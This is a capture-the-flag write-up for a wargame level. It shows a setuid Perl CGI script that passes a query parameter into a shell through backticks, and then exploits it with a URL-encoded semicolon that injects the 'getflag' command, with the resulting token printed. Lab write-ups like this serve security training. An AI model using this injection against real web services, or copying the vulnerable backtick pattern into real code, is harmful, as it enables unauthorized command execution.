# Level 04

## Initial Reconnaissance
When browsing the files of the home of level04 user, we can see there is a perl file called level04.pl owned by level04.

```bash
ls -Al
```

```
total 16
-r-x------ 1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------ 1 level04 level04 3518 Aug 30  2015 .bashrc
-r-x------ 1 level04 level04  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag04  level04  152 Mar  5  2016 level04.pl
```

Let's see what the file contains.

```bash
cat level04.pl
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## Vulnerability Found
It suggest that there is a server running on localhost:4747 running a perl script for CGI.

We can try to access the server with a browser.

```bash
curl http://localhost:4747/?x=hello
```

```
hello
```

We can see that the script is executing the command echo hello, very likely as user flag04. The backticks indicate that a subshell is executed.

## Exploitation Steps
The CGI doesn't accept special characters like ; or &. But we can bypass this with the hexadecimal value of the character. Here we can use ; (3b) to execute the getflag command.

```
level04@SnowCrash:~$ curl http://localhost:4747/?x=hi%3bgetflag
hi
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## Additional Notes

